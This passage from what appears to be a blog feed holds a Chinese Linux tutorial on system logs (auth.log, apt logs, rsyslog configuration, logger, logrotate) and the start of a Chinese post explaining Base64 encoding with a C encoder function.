中的信息，在本实验环境中没有任何日志输出是因为刚刚启动的系统中并没有任何的更新迭代。我可以看看从其他地方截取过来的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">update-alternatives 2016-07-02 13:36:16: run with --install /usr/bin/x-www-browser x-www-browser /usr/bin/google-chrome-stable 200<br>update-alternatives 2016-07-02 13:36:16: run with --install /usr/bin/gnome-www-browser gnome-www-browser /usr/bin/google-chrome-stable 200<br>update-alternatives 2016-07-02 13:36:16: run with --install /usr/bin/google-chrome google-chrome /usr/bin/google-chrome-stable 200<br></code></pre></td></tr></table></figure><p>我们可以从中得到的信息有程序作用，日期，命令，成功与否的返回码。</p><p>我们用这样的命令来看看 <code>auth.log</code> 中的信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo less /var/<span class="hljs-built_in">log</span>/auth.log<br></code></pre></td></tr></table></figure><p><img src="https://dn-simplecloud.shiyanlou.com/1135081469409885670" alt="实验楼"></p><p>我们可以从中得到的信息有日期与 ip 地址的来源以及的用户与工具。</p><p>在 <code>/var/log/apt</code> 文件夹中有两个日志文件 <code>history.log</code> 与 <code>term.log</code>，两个日志文件的区别在于 <code>history.log</code> 主要记录了进行了哪个操作，相关的依赖有哪些，而 <code>term.log</code> 则是较为具体的一些操作，主要就是下载包，打开包，安装包等等的细节操作。</p><p>如果是刚刚开启的新系统，那么按理说这些日志应该都是空的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo cat /var/<span class="hljs-built_in">log</span>/apt/history.log<br>sudo cat /var/<span class="hljs-built_in">log</span>/apt/term.log<br></code></pre></td></tr></table></figure><p><img src="https://doc.shiyanlou.com/courses/1379/871732/7bc699b28ff48cefee31fa859af518d9-0" alt="图片描述"></p><p>但是在实验环境中因为是启动的我们定制后的环境，所以两个日志中还残留了配置镜像的记录。可以先删除这两个文件然后再执行新的安装命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo rm /var/<span class="hljs-built_in">log</span>/apt/history.log<br>sudo rm /var/<span class="hljs-built_in">log</span>/apt/term.log<br></code></pre></td></tr></table></figure><p>我们来安装 git 这个程序，因为实验环境里已经预装了 git，所以这里真正执行的操作是一个更新的操作，但这并不影响。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get install git<br></code></pre></td></tr></table></figure><p><img src="https://doc.shiyanlou.com/courses/uid871732-20200807-1596779861997" alt="图片描述"></p><p>成功的执行之后我们再来查看两个日志的内容变化：</p><p><img src="https://doc.shiyanlou.com/courses/1379/871732/dc97b5ebc3c1054d4e5a6070fa36773b-0" alt="图片描述"></p><p>其他的日志格式也都类似于之前我们所查看的日志，主要便是时间，操作。而这其中有两个比较特殊的日志，其查看的方式比较与众不同，因为这两个日志并不是 ASCII 文件而是被编码成了二进制文件，所以我们并不能直接使用 less、cat、more 这样的工具来查看，这两个日志文件是 wtmp，lastlog</p><p><img src="https://dn-simplecloud.shiyanlou.com/1135081469412303087" alt="实验楼"></p><p>我们查看的方法是使用 last 与 lastlog 工具来提取其中的信息</p><p><img src="https://dn-simplecloud.shiyanlou.com/1135081469412472830" alt="实验楼"></p><p>关于这两个工具的更深入使用我们可以使用前面的学习过的 man 来查看</p><p>这些日志是如何产生的？通过上面的例子我们可以看出大部分的日志信息似乎格式都很类似，并且都出现在这个文件夹中。</p><p>这样的实现可以通过两种方式：</p><ul><li>一种是由软件开发商自己来自定义日志格式然后指定输出日志位置；</li><li>一种方式就是 Linux 提供的日志服务程序，而我们这里系统日志是通过 syslog 来实现，提供日志管理服务。</li></ul><p>syslog 是一个系统日志记录程序，在早期的大部分 Linux 发行版都是内置 syslog，让其作为系统的默认日志收集工具，虽然随着时代的进步与发展，syslog 已经年老体衰跟不上时代的需求，所以他被 rsyslog 所代替了，较新的 Ubuntu、Fedora 等等都是默认使用 rsyslog 作为系统的日志收集工具</p><p>rsyslog 的全称是 rocket-fast system for log，它提供了高性能，高安全功能和模块化设计。rsyslog 能够接受各种各样的来源，将其输入，输出的结果到不同的目的地。rsyslog 可以提供超过每秒一百万条消息给目标文件。</p><p>这样能实时收集日志信息的程序是有其守护进程的，如 rsyslog 的守护进程便是 rsyslogd</p><p>因为一些原因本实验环境中默认并没有打开这个服务，我们可以手动开启这项服务，然后来查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get update<br>sudo apt-get install -y rsyslog<br>sudo service rsyslog start<br>ps aux | grep syslog<br></code></pre></td></tr></table></figure><p><img src="https://dn-simplecloud.shiyanlou.com/1135081469414492628" alt="实验楼"></p><p>既然它是一个服务，那么它便是可以配置，为我们提供一些我们自定义的服务</p><p>首先我们来看 rsyslog 的配置文件是什么样子的，而 rsyslog 的配置文件有两个，</p><ul><li>一个是 <code>/etc/rsyslog.conf</code></li><li>一个是 <code>/etc/rsyslog.d/50-default.conf</code>。</li></ul><p>第一个主要是配置的环境，也就是 rsyslog 加载什么模块，文件的所属者等；而第二个主要是配置的 Filter Conditions</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/rsyslog.conf<br><br>vim /etc/rsyslog.d/50-default.conf<br></code></pre></td></tr></table></figure><p><img src="https://dn-simplecloud.shiyanlou.com/1135081469414801715" alt="实验楼"></p><p><img src="https://dn-simplecloud.shiyanlou.com/1135081469433052645" alt="实验楼"></p><p>也不知道他在写什么，我们还是来看看 rsyslog 的结构框架，数据流的走向吧。</p><p><img src="https://dn-simplecloud.shiyanlou.com/1135081469416361678" alt="实验楼"></p><p>通过这个简单的流程图我们可以知道 rsyslog 主要是由 Input、Output、Parser 这样三个模块构成的，并且了解到数据的简单走向，首先通过 Input module 来收集消息，然后将得到的消息传给 Parser module，通过分析模块的层层处理，将真正需要的消息传给 Output module，然后便输出至日志文件中。</p><p>上文提到过 rsyslog 号称可以提供超过每秒一百万条消息给目标文件，怎么只是这样简单的结构。我们可以通过下图来做更深入的了解</p><p><img src="https://dn-simplecloud.shiyanlou.com/1135081469415269198" alt="实验楼"></p><p>（图片来源于http://www.rsyslog.com/doc/queues_analogy.html）</p><p>Rsyslog 架构如图中所示，从图中我们可以很清楚的看见，rsyslog 还有一个核心的功能模块便是 Queue，也正是因为它才能做到如此高的并发。</p><p>第一个模块便是 Input，该模块的主要功能就是从各种各样的来源收集 messages，通过这些接口实现：</p><table><thead><tr><th>接口名</th><th>作用</th></tr></thead><tbody><tr><td>im3195</td><td>RFC3195 Input Module</td></tr><tr><td>imfile</td><td>Text File Input Module</td></tr><tr><td>imgssapi</td><td>GSSAPI Syslog Input Module</td></tr><tr><td>imjournal</td><td>Systemd Journal Input Module</td></tr><tr><td>imklog</td><td>Kernel Log Input Module</td></tr><tr><td>imkmsg</td><td>/dev/kmsg Log Input Module</td></tr><tr><td>impstats</td><td>Generate Periodic Statistics of Internal Counters</td></tr><tr><td>imptcp</td><td>Plain TCP Syslog</td></tr><tr><td>imrelp</td><td>RELP Input Module</td></tr><tr><td>imsolaris</td><td>Solaris Input Module</td></tr><tr><td>imtcp</td><td>TCP Syslog Input Module</td></tr><tr><td>imudp</td><td>UDP Syslog Input Module</td></tr><tr><td>imuxsock</td><td>Unix Socket Input</td></tr></tbody></table><p>而 Output 中也有许多可用的接口，可以通过 man 或者官方的文档查看</p><p>而这些模块接口的使用需要通过 $ModLoad 指令来加载，那么返回上文的图中，配置生效的头两行可以看懂了，默认加载了 imklog、imuxsock 这两个模块</p><p>在配置中 rsyslog 支持三种配置语法格式：</p><ul><li>sysklogd</li><li>legacy rsyslog</li><li>RainerScript</li></ul><p>sysklogd 是老的简单格式，一些新的语法特性不支持。而 legacy rsyslog 是以 dollar 符($)开头的语法，在 v6 及以上的版本还在支持，就如上文所说的 <code>$ModLoad</code> 还有一些插件和特性只在此语法下支持。而以 <code>$</code> 开头的指令是全局指令，全局指令是 rsyslogd 守护进程的配置指令，每行只能有一个指令。 RainnerScript 是最新的语法。在官网上 rsyslog 大多推荐这个语法格式来配置</p><p>老的语法格式（sysklogd &amp; legacy rsyslog）是以行为单位。新的语法格式（RainnerScript）可以分割多行。</p><p>注释有两种语法:</p><ul><li>井号 #</li><li>C-style <code>/* .. */</code></li></ul><p>执行顺序: 指令在 rsyslog.conf 文件中是从上到下的顺序执行的。</p><p>模板是 rsyslog 一个重要的属性，它可以控制日志的格式，支持类似 template() 语句的基于 string 或 plugin 的模板，通过它我们可以自定义日志格式。</p><p>legacy 格式使用 $template 的语法，不过这个在以后要移除，所以最好使用新格式 template():，以免未来突然不工作了也不知道为什么</p><p>模板定义的形式有四种，适用于不同的输出模块，一般简单的格式，可以使用 string 的形式，复杂的格式，建议使用 list 的形式，使用 list 的形式，可以使用一些额外的属性字段（property statement）</p><p>如果不指定输出模板，rsyslog 会默认使用 RSYSLOG_DEFAULT。若想更深入的学习可以查看<a href="http://www.rsyslog.com/doc/v8-stable/configuration/index.html">官方文档</a></p><p>了解了 rsyslog 环境的配置文件之后，我们看向 <code>/etc/rsyslog.d/50-default.conf</code> 这个配置文件，这个文件中主要是配置的 Filter Conditions，也就是我们在流程图中所看见的 <code>Parser &amp; Filter Engine</code>，它的名字叫 Selectors 是过滤 syslog 的传统方法，他主要由两部分组成，<code>facility</code> 与 <code>priority</code>，其配置格式如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">facility.priority log_location<br></code></pre></td></tr></table></figure><p>其中一个 priority 可以指定多个 facility，多个 facility 之间使用逗号 <code>,</code> 分割开</p><p>rsyslog 通过 Facility 的概念来定义日志消息的来源，以便对日志进行分类，Facility 的种类有：</p><table><thead><tr><th>类别</th><th>解释</th></tr></thead><tbody><tr><td>kern</td><td>内核消息</td></tr><tr><td>user</td><td>用户信息</td></tr><tr><td>mail</td><td>邮件系统消息</td></tr><tr><td>daemon</td><td>系统服务消息</td></tr><tr><td>auth</td><td>认证系统</td></tr><tr><td>authpriv</td><td>权限系统</td></tr><tr><td>syslog</td><td>日志系统自身消息</td></tr><tr><td>cron</td><td>计划安排</td></tr><tr><td>news</td><td>新闻信息</td></tr><tr><td>local0~7</td><td>由自定义程序使用</td></tr></tbody></table><p>而另外一部分 priority 也称之为 serverity level，除了日志的来源以外，对统一源产生日志消息还需要进行优先级的划分，而优先级的类别有以下几种：</p><table><thead><tr><th>类别</th><th>解释</th></tr></thead><tbody><tr><td>emergency</td><td>系统已经无法使用了</td></tr><tr><td>alert</td><td>必须立即处理的问题</td></tr><tr><td>critical</td><td>很严重了</td></tr><tr><td>error</td><td>错误</td></tr><tr><td>warning</td><td>警告信息</td></tr><tr><td>notice</td><td>系统正常，但是比较重要</td></tr><tr><td>informational</td><td>正常</td></tr><tr><td>debug</td><td>debug 的调试信息</td></tr><tr><td>panic</td><td>很严重但是已淘汰不常用</td></tr><tr><td>none</td><td>没有优先级，不记录任何日志消息</td></tr></tbody></table><p>我们来看看系统中的配置</p><p><img src="https://dn-simplecloud.shiyanlou.com/1135081469433052645" alt="实验楼"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">auth,authpriv.*       /var/<span class="hljs-built_in">log</span>/auth.log<br></code></pre></td></tr></table></figure><p>这里的意思是 auth 与 authpriv 的所有优先级的信息全都输出于 <code>/var/log/auth.log</code> 日志中</p><p>而其中有类似于这样的配置信息意思有细微的差别</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kern.*      -/var/<span class="hljs-built_in">log</span>/kern.log<br></code></pre></td></tr></table></figure><p><code>-</code> 代表异步写入，也就是日志写入时不需要等待系统缓存的同步，也就是日志还在内存中缓存也可以继续写入无需等待完全写入硬盘后再写入。通常用于写入数据比较大时使用。</p><p>到此我们对 rsyslog 的配置就有了一定的了解，若想更深入学习模板，队列的高级应用，大家可去查看<a href="http://www.rsyslog.com/doc/v8-stable/index.html">官网的文档</a>，需要注意的是 rsyslog 每个版本之间差异化比较大，学习之前先查看自己所使用的版本，再去查看相关的文档</p><p>与日志相关的还有一个还有常用的命令 <code>logger</code>，<code>logger</code> 是一个 shell 命令接口，可以通过该接口使用 Syslog 的系统日志模块，还可以从命令行直接向系统日志文件写入信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#首先将syslog启动起来</span><br>sudo service rsyslog start<br><br><span class="hljs-comment">#向 syslog 写入数据</span><br>ping 127.0.0.1 | logger -it logger_test -p local3.notice &amp;<br><br><span class="hljs-comment">#查看是否有数据写入</span><br>sudo tail -f /var/<span class="hljs-built_in">log</span>/syslog<br></code></pre></td></tr></table></figure><p><img src="https://dn-simplecloud.shiyanlou.com/1135081469474419356" alt="实验楼"></p><p>从图中我们可以看到我们成功的将 ping 的信息写入了 syslog 中，格式也就是使用的 rsyslog 的默认模板</p><p>我们可以通过 man 来查看 logger 的其他用法，</p><table><thead><tr><th>参数</th><th>内容</th></tr></thead><tbody><tr><td>-i</td><td>在每行都记录进程 ID</td></tr><tr><td>-t</td><td>添加 tag 标签</td></tr><tr><td>-p</td><td>设置日志的 facility 与 priority</td></tr></tbody></table><h3 id="日志转储">日志转储</h3><p>在本地的机器中每天都有成百上千条日志被写入文件中，更别说是我们的服务器，每天都会有数十兆甚至更多的日志信息被写入文件中，如果是这样的话，每天看着我们的日志文件不断的膨胀，那岂不是要占用许多的空间，所以有个叫 logrotate 的东西诞生了。</p><p>logrotate 程序是一个日志文件管理工具。用来把旧的日志文件删除，并创建新的日志文件。我们可以根据日志文件的大小，也可以根据其天数来切割日志、管理日志，这个过程又叫做“转储”。</p><p>大多数 Linux 发行版使用 logrotate 或 newsyslog 对日志进行管理。logrotate 程序不但可以压缩日志文件，减少存储空间，还可以将日志发送到指定 E-mail，方便管理员及时查看日志。</p><p>显而易见，logrotate 是基于 CRON 来运行的，其脚本是 /etc/cron.daily/logrotate；同时我们可以在 <code>/etc/logrotate</code> 中找到其配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cat /etc/logrotate.conf<br></code></pre></td></tr></table></figure><p><img src="https://dn-simplecloud.shiyanlou.com/1135081469476364695" alt="实验楼"></p><p>这其中的具体意思是什么呢？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># see &quot;man logrotate&quot; for details  //可以查看帮助文档</span><br><span class="hljs-comment"># rotate log files weekly</span><br>weekly                             //设置每周转储一次(daily、weekly、monthly当然可以使用这些参数每天、星期，月 )<br><span class="hljs-comment"># keep 4 weeks worth of backlogs</span><br>rotate 4                           //最多转储4次<br><span class="hljs-comment"># create new (empty) log files after rotating old ones</span><br>create                             //当转储后文件不存在时创建它<br><span class="hljs-comment"># uncomment this if you want your log files compressed</span><br>compress                          //通过gzip压缩方式转储（nocompress可以不压缩）<br><span class="hljs-comment"># RPM packages drop log rotation information into this directory</span><br>include /etc/logrotate.d           //其他日志文件的转储方式配置文件，包含在该目录下<br><span class="hljs-comment"># no packages own wtmp -- we&#x27;ll rotate them here</span><br>/var/<span class="hljs-built_in">log</span>/wtmp &#123;                    //设置/var/<span class="hljs-built_in">log</span>/wtmp日志文件的转储参数<br>    monthly                        //每月转储<br>    create 0664 root utmp          //转储后文件不存在时创建它，文件所有者为root，所属组为utmp，对应的权限为0664<br>    rotate 1                       //最多转储一次<br>&#125;<br></code></pre></td></tr></table></figure><p>当然在 /etc/logrotate.d/ 中有各项应用的 logrotate 配置，还有更多的配置参数，大家可以使用 man 查看，如按文件大小转储，按当前时间格式命名等等参数配置。</p>]]></content>
    
    
    <categories>
      
      <category>Linux Study</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Base 64	个人理解笔记</title>
    <link href="/2022/03/14/Base%2064%E4%B8%AA%E4%BA%BA%E7%90%86%E8%A7%A3%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/03/14/Base%2064%E4%B8%AA%E4%BA%BA%E7%90%86%E8%A7%A3%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="Base-64-加密标准码表">Base 64 加密标准码表</h2><p><img src="https://static01.imgkr.com/temp/cbd8c3ab2e43414eb5d5f3785a75ec09.png" alt=""></p><h2 id="Base64加密过程">Base64加密过程</h2><h3 id="原理">原理</h3><p>我们将字符串中的字符每3个一分割，再将3个字符转换为每个8位数长的2进制数据。</p><blockquote><p>如输入：ABC，则转换的二进制是：A : 01000001、B : 01000010、C : 01000011</p></blockquote><p>我们将这3个二进制的数据拼在一起得到一个全新的二进制数据</p><blockquote><p><code>010000010100001001000011</code></p></blockquote><p>我们再对其每六个一分组，并在最高位补上00</p><blockquote><p>分组出来为  <code>010000  010100  001001  000011</code>，补上00后为 <code> 00010000   00010100   00001001   00000011</code></p></blockquote><p>之后我们对其转化为10进制</p><blockquote><p>可以得到1620193</p></blockquote><p>再对应开头的标准码表进行 ” 翻译 “ 得到新的字符，再将他们拼在一起就是我们想要得到的加密后的数据了。</p><blockquote><p>可以得到QUJD</p></blockquote><h4 id="可是如果我们的字符不是3的倍数怎么办呢？">可是如果我们的字符不是3的倍数怎么办呢？</h4><p>我们以<code>Basic</code>来进行类推，<code>Basic</code>一共是5个字符我们按照相同的步骤来进行</p><blockquote><p>B：01000010a：01100001s：01110011i：01101001c：01100011</p><p>进行拼接得到<code>0100001001100001011100110110100101100011</code></p><p>再进行每六个一组得到<code>0100001001100001011100110110100101100011</code></p></blockquote><p>这个时候我们就会发现最后面怎么只有4个数字呢？</p><p>我们可以发现一个规律（ 3 * 8 = 4 * 6 ）二进制数是长度为 8 ，而我们是按照每 6 个数字一组，所以我们每 3 个字符一起就可以转换成 4组数据。但是我们按照之前的最高位加上 00 后最后一个也才是 000011 不是 8位长度，这个时候我们就要再末尾补上 0 让其变为 8 位的二进制数，我们也就得到了 00001100</p><blockquote><p>这个时候我们便可以按照之前的法则进行转换，我们可以得到 ： <code>00010000001001100000010100110011000110100001011000001100</code></p><p>我们把上面的数据分一下组：</p><p><code>00010000001001100000010100110011000110100001011000001100</code></p><p>转换为 10 进制可以得到：1638551262212</p><p>对照码表我们得到了：<code>QmFzaWM</code></p></blockquote><h4 id="这个时候如果你去在线的网站上转换的话你会发现后面多出来一个-，这又是为什么呢？">这个时候如果你去在线的网站上转换的话你会发现后面多出来一个 = ，这又是为什么呢？</h4><blockquote><p><img src="https://static01.imgkr.com/temp/e05bf3f95f8d481eaaaaf44e68cda5a7.png" alt=""></p></blockquote><p>一般而言我们在进行编码加密的时候会遇到余下两个或者一个字符，这个时候我们就会在末尾补上对应个数的 0 使之成为 8 位的二进制数，因为我们在输入之前便已经得到了字符串<code>Basic</code>的长度为 5 ，那么我们便可以判断出会有几个字符串剩余，每有一个字符串剩余我们就会在最后的密文里面加入对应数量的 =</p><h3 id="实现方法">实现方法</h3><p>Base64在对输入的数据进行加密时是以每三个字符为一组，进行对应的位运算，如果字符剩余两个则在对这两个数据进行位运算加密后的密文补上一个<code>=</code>，如果剩余一个字符在同样的位运算加密后的密文补上两个<code>=</code>。</p><h4 id="我们同样以ABC为例子-用位运算实现上面的一般原理">我们同样以ABC为例子,用位运算实现上面的一般原理</h4><blockquote><h5 id="A：A-Q">A：<code>A -&gt; Q</code></h5><p>那么这个要怎么实现呢？我们先观察两者的二进制数</p><p>A 的二进制数是：01000001Q的二进制数是：00010000</p><p>不难看出 <code>A</code>在右移两位后便得到了<code>Q</code></p><h5 id="B：B-U-J">B：<code>B -&gt; U J</code></h5><p>B 的二进制数是：<code>01000010</code>，可是我们是将A的二进制数的最后两位与B的二进制数的开头四位组成的一个新的二进制数在在最高位补上 00 得到<code>00010100</code> （ U ）再把 B 的最后两位二进制数与 C 的前四位二进制数组成<code>00001001</code> ( J )</p><h6 id="这个要怎么实现呢？">这个要怎么实现呢？</h6><h6 id="U">U :</h6><p>我们借用与运算<code>（&amp;）</code>的规则，两个操作对象同一位都为 1 则结果对应位为 1 ，否则对应结果为 0，我们要取最后的两位那么我们可以借用 <code>0x3</code> (3)</p><p>0x3的二进制数是：<code>00000011</code> 在和A的二进制进行与运算后可以得到：<code>00000001</code>，我们要在最高位加上00，并且第3、4位是A的最后两位二进制数，而现在的二进制数是：<code>00000001</code>，那么我们再次移位向左移 4 位得到：<code>00010000</code></p><p>接下来我们还要取<code>B</code>的二进制数的前4位<code>0100</code>,同样的我们将<code>B</code>右移4位便可以得到：<code>00000100</code>，但是我们要把<code>A</code>的后两位二进制与<code>B</code>的前4位二进制拼在一起，这个时候又该怎么办呢？</p><p>我们借助或运算<code>( | )</code>，若两个操作对象同一位都为 0，则结果对应位为 0，否则对应位为 1 。</p><p>我们把<code>00010000</code>和<code>00000100</code>进行或运算便得到了：<code>00010100</code> 转化成 10进制为 20，对应码表为 <code>U</code></p><h6 id="J">J :</h6><p>按照上述步骤我们将 B 与 0xf （<code>00001111</code>) 进行与运算得到 B 的二进制数最后 4 位在左移 2 位，C 则右移 6 位得到其最后两位二进制数，将两个数进行或运算即可得到：<code>00001001</code>转化成 10进制为 9，对应码表为 <code>J</code></p><h5 id="C-C-J-D">C : <code>C -&gt; J D</code></h5><h6 id="D">D :</h6><p>对于 D 而言我们仅需要去取二进制数的后 6 位就可以了，那么我们将 C 和 <code>0x3f</code>进行与运算便可以得到<code>00000011</code>转化成 10进制为 3，对应码表为 <code>D</code></p></blockquote><h4 id="此时我们便完成了对应数据的加密过程，那么在代码上是如何实现的呢？">此时我们便完成了对应数据的加密过程，那么在代码上是如何实现的呢？</h4><h5 id="代码如下-：">代码如下 ：</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *<span class="hljs-title">base64_encode</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *str)</span>  </span><br><span class="hljs-function"></span>&#123;  <br>    <span class="hljs-keyword">long</span> len;  <br>    <span class="hljs-keyword">long</span> str_len;  <br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *res;  <br>    <span class="hljs-keyword">int</span> i,j;  <br><span class="hljs-comment">//定义base64编码表  </span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *base64_table=<span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>;  <br>  <br><span class="hljs-comment">//计算经过base64编码后的字符串长度  </span><br>    str_len=<span class="hljs-built_in">strlen</span>(str);  <br>    <span class="hljs-keyword">if</span>(str_len % <span class="hljs-number">3</span> == <span class="hljs-number">0</span>)  <br>        len=str_len/<span class="hljs-number">3</span>*<span class="hljs-number">4</span>;  <br>    <span class="hljs-keyword">else</span>  <br>        len=(str_len/<span class="hljs-number">3</span>+<span class="hljs-number">1</span>)*<span class="hljs-number">4</span>;  <br>  <br>    res=<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)*len+<span class="hljs-number">1</span>);  <br>    res[len]=<span class="hljs-string">&#x27;\0&#x27;</span>;  <br>  <br><span class="hljs-comment">//以3个8位字符为一组进行编码  </span><br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>,j=<span class="hljs-number">0</span>;i&lt;len<span class="hljs-number">-2</span>;j+=<span class="hljs-number">3</span>,i+=<span class="hljs-number">4</span>)  <br>    &#123;  <br>        <br>        res[i]=base64_table[str[j]&gt;&gt;<span class="hljs-number">2</span>]; <span class="hljs-comment">//取出第一个字符的前6位并找出对应的结果字符  </span><br>        <br>        res[i+<span class="hljs-number">1</span>]=base64_table[(str[j]&amp;<span class="hljs-number">0x3</span>)&lt;&lt;<span class="hljs-number">4</span> | (str[j+<span class="hljs-number">1</span>]&gt;&gt;<span class="hljs-number">4</span>)]; <span class="hljs-comment">//将第一个字符的后位与第二个字符的前4位进行组合并找到对应的结果字符 </span><br>        <br>        res[i+<span class="hljs-number">2</span>]=base64_table[(str[j+<span class="hljs-number">1</span>]&amp;<span class="hljs-number">0xf</span>)&lt;&lt;<span class="hljs-number">2</span> | (str[j+<span class="hljs-number">2</span>]&gt;&gt;<span class="hljs-number">6</span>)]; <span class="hljs-comment">//将第二个字符的后4位与第三个字符的前2位组合并找出对应的结果字符  </span><br>        <br>        res[i+<span class="hljs-number">3</span>]=base64_table[str[j+<span class="hljs-number">2</span>]&amp;<span class="hljs-number">0x3f</span>]; <span class="hljs-comment">//取出第三个字符的后6位并找出结果字符  </span><br>        <br>    &#125;  <br>  <br>    <span class="hljs-built_in"><span class="hljs-keyword">switch</span></span>(str_len % <span class="hljs-number">3</span>)  <br>    &#123;  <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:  <br>            res[i<span class="hljs-number">-2</span>]=<span class="hljs-string">&#x27;=&#x27;</span>;  <br>            res[i<span class="hljs-number">-1</span>]=<span class="hljs-string">&#x27;=&#x27;</span>;  <br>            <span class="hljs-keyword">break</span>;  <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:  <br>            res[i<span class="hljs-number">-1</span>]=<span class="hljs-string">&#x27;=&#x27;</span>;  <br>            <span class="hljs-keyword">break</span>;  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">return</span> res;  <br>&#125;  <br><br></code></pre></td></tr></table></figure><p>我们加密一般是采用每 3 个一加密 ，而对于这 3 个字符来说，进行的操作都是同质化的，可以按照上面的模板进行加密，因而可以快速完成加密。</p><h2 id="解密过程-：">解密过程 ：</h2><h3 id="原理-2">原理</h3><p>在加密过程中我们了解到了（ 3 * 8 = 4 * 6 ）的规律，那么我们再次利用这个规律将其还原回去，不过这次便是以 4 位为一组，来进行解密，因为 = 的加入，所以都能按照 4 个一组进行分配。按照上面的码表进行查找其对应的 10 进制数据，我们再将 10 进制数据转换为8 位长度的二进制数据之后去除最高位的 00 进行拼接，得到一串新的二进制数据。我们对这串数据按每 8 个一组分割，便可以得到对应明文中字符对应的二进制数据，最后进行转换和拼接，便是明文。</p><p>其中在解密过程中我们将 = 对应的二进制为<code>00000000</code>，不过一般在解密过程中我们会忽略 = ，将字符串进行解密。（python 中如果密文数据不为 4 的倍数会报错）</p><blockquote><p>我们仍以 ABC 为例子，ABC转换出的数据是 QUJD</p><p>我们逆向查找码表可以得到对应的数据分别为：1620193</p><p>我们依次转换为二进制并去除最高位的 00 得到：<code>010000  010100  001001  000011</code></p><p>我们可以看到现在的数据就是 6 位二进制数据了我们按照加密过程的逆向进行操作将上述数据拼接，每 8 个数字一组可以得到：<code>010000010100001001000011</code>，我们将这些数据还原成字符便可以得到明文 ABC</p></blockquote><h3 id="实现方法-2">实现方法</h3><p>因为最终的密文中，如果 6 位二进制数据的分组不满 4 组，会有 <code>=</code> 作为填充物，所以一个 Base64 完后的密文总是能够被 4 整除。所以，在解密中，我们每次需要处理 4 个字符，将这 4 个字符编码之后转换成十进制，再转换成二进制，不足 6 位的高位补0，然后将 6 个位一组的二进制数按原顺序重新分成每 8 个位一组，也就是一个字节一组。然后将其转换成十六进制，再转换成对应的字符。</p><blockquote><p>我们以 Basic 为例子进行翻译明文，我们知道密文是 QmFzaWM=<br>我们分一下组 QmFzaWM=</p><h6 